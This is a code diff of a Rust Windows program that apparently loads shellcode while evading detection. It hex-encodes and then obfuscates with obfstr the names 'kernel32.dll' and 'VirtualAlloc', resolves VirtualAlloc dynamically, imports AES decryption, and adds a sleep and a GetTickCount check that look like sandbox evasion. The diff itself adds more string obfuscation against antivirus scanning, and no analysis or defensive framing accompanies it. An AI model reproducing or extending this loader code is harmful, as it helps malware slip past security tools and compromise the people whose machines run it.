@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+// #![windows_subsystem = "windows"]
 extern crate alloc;
 
 use alloc::ffi::CString;
@@ -7,9 +7,10 @@ use std::arch::asm;
 use std::mem::transmute;
 use std::ptr::{null, null_mut};
 use std::time::Duration;
-use obfstr::obfstr as s;
+
 use hex;
 use libaes::Cipher;
+use obfstr::obfstr as s;
 use rand::Rng;
 use winapi::um::libloaderapi::{GetModuleHandleA, GetProcAddress};
 use winapi::um::sysinfoapi::GetTickCount;
@@ -22,7 +23,6 @@ type CustomVirtualAlloc = unsafe extern "system" fn(
     flAllocationType: u32,
     flProtect: u32,
 ) -> *mut winapi::ctypes::c_void;
-
 
 
 fn main() {
@@ -46,8 +46,8 @@ fn main() {
     thread::sleep(Duration::from_secs(2));
 
 
-    let Kname = hex::decode("6b65726e656c33322e646c6c").expect("hex decode err");
-    let Vname = hex::decode("5669727475616c416c6c6f63").expect("hex decode err");
+    let Kname = hex::decode(s!("6b65726e656c33322e646c6c")).expect("hex decode err");
+    let Vname = hex::decode(s!("5669727475616c416c6c6f63")).expect("hex decode err");
     let kernel32 = CString::new(Kname).expect("CString::new failed");
     let virtual_alloc = CString::new(Vname).expect("CString::new failed");
 
